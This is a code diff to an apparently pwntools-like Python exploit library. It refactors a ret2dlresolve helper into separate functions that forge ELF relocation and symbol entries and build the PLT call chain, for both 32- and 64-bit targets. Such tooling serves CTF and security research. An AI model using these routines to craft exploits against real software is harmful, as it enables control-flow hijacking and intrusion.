@@ -5,7 +5,6 @@ import os
 import re
 import struct
 import socket
-import time
 import fcntl
 import select
 import random
@@ -621,11 +620,11 @@ class ROP(ELF):
             buf += p64(0) * 6
         return buf
 
-    def dl_resolve(self, base, name, *args, **kwargs):
-        def align(x, origin, size):
-            pad = size - ((x-origin) % size)
-            return (x+pad, pad)
+    def align(self, addr, origin, size):
+        padlen = size - ((addr-origin) % size)
+        return (addr+padlen, padlen)
 
+    def dl_resolve_data(self, base, name):
         if self.wordsize == 8:
             jmprel = self.dynamic('JMPREL')
             relaent = self.dynamic('RELAENT')
@@ -633,24 +632,16 @@ class ROP(ELF):
             syment = self.dynamic('SYMENT')
             strtab = self.dynamic('STRTAB')
 
-            # prerequisite:
-            # 1) overwrite (link_map + 0x1c8) with NULL
-            # 2) set registers for arguments
-            addr_reloc, pad_reloc = align(base + self.wordsize*3, jmprel, relaent)
-            addr_sym, pad_sym = align(addr_reloc + 0x18, symtab, syment)
+            addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)
+            addr_sym, padlen_sym = self.align(addr_reloc+relaent, symtab, syment)
             addr_symstr = addr_sym + syment
-            addr_end = addr_symstr + len(name) + 1
 
-            reloc_offset = (addr_reloc - jmprel) / relaent
             r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
             st_name = addr_symstr - strtab
 
-            buf = self.p(self.plt())
-            buf += self.p(reloc_offset)
-            buf += self.p(kwargs.get('retaddr', addr_end))
-            buf += self.fill(pad_reloc)
-            buf += struct.pack('<QQQ', self.section('.bss'), r_info, 0)  # Elf64_Rela
-            buf += self.fill(pad_sym)
+            buf = self.fill(padlen_reloc)
+            buf += struct.pack('<QQQ', base, r_info, 0)                  # Elf64_Rela
+            buf += self.fill(padlen_sym)
             buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
             buf += self.string(name)
         else:
@@ -660,26 +651,48 @@ class ROP(ELF):
             syment = self.dynamic('SYMENT')
             strtab = self.dynamic('STRTAB')
 
-            arg_values = self.p(args)
-
-            addr_reloc, pad_reloc = align(base + self.wordsize*3 + len(arg_values), jmprel, relent)
-            addr_sym, pad_sym = align(addr_reloc+relent, symtab, syment)
+            addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
+            addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)
             addr_symstr = addr_sym + syment
-            addr_end = addr_symstr + len(name) + 1
 
-            reloc_offset = addr_reloc - jmprel
             r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
             st_name = addr_symstr - strtab
 
-            buf = self.p(self.plt())
-            buf += self.p(reloc_offset)
-            buf += self.p(kwargs.get('retaddr', addr_end))
-            buf += arg_values
-            buf += self.fill(pad_reloc)
-            buf += struct.pack('<II', self.section('.bss'), r_info)      # Elf32_Rel
-            buf += self.fill(pad_sym)
+            buf = self.fill(padlen_reloc)
+            buf += struct.pack('<II', base, r_info)                      # Elf32_Rel
+            buf += self.fill(padlen_sym)
             buf += struct.pack('<IIII', st_name, 0, 0, 0x12)             # Elf32_Sym
             buf += self.string(name)
+
+        return buf
+
+    def dl_resolve_call(self, base, *args):
+        if self.wordsize == 8:
+            # prerequisite:
+            # 1) overwrite (link_map + 0x1c8) with NULL
+            # 2) set registers for arguments
+            if args:
+                raise Exception('arguments must be set to the registers beforehand')
+
+            jmprel = self.dynamic('JMPREL')
+            relaent = self.dynamic('RELAENT')
+
+            addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)
+            reloc_offset = (addr_reloc - jmprel) / relaent
+
+            buf = self.p(self.plt())
+            buf += self.p(reloc_offset)
+        else:
+            jmprel = self.dynamic('JMPREL')
+            relent = self.dynamic('RELENT')
+
+            addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
+            reloc_offset = addr_reloc - jmprel
+
+            buf = self.p(self.plt())
+            buf += self.p(reloc_offset)
+            buf += self.p(self.gadget('pop', n=len(args)))
+            buf += self.p(args)
 
         return buf
 
